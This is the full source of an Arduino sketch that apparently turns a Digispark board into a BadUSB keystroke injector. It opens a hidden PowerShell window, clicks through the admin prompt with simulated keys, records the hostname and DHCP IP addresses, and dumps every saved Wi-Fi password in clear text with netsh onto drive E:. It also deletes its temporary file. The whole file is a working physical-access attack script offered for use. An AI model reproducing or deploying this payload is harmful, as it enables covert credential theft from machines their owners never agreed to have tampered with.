// Author : Rezureax //
#include "DigiKeyboardDe.h"
void setup() {
  pinMode(1, OUTPUT);
}
void loop() {
  DigiKeyboard.delay(5000);
  DigiKeyboardDe.sendKeyStroke(0);
  DigiKeyboardDe.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboardDe.print("powershell -windowstyle hidden");
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboardDe.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboardDe.print("cd $env:temp");
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboardDe.print("$cmd = {hostname; Get-NetIpaddress | Where PrefixOrigin -EQ DHCP}");
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboardDe.print("$cmd.InvokeReturnAsIs() | Out-File $env:temp/netinfo.txt -Append");
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboardDe.print("Copy-Item -Path $env:temp/netinfo.txt -Destination E:");
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1200);
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboardDe.print("rm netinfo.txt");
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboardDe.print("exit");
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboardDe.sendKeyStroke(0);
  DigiKeyboardDe.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboardDe.print("cmd");
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboardDe.print("netsh wlan show profile * key=clear >E:wifipw.txt");
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("exit");
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW);
  DigiKeyboard.delay(5000);
}
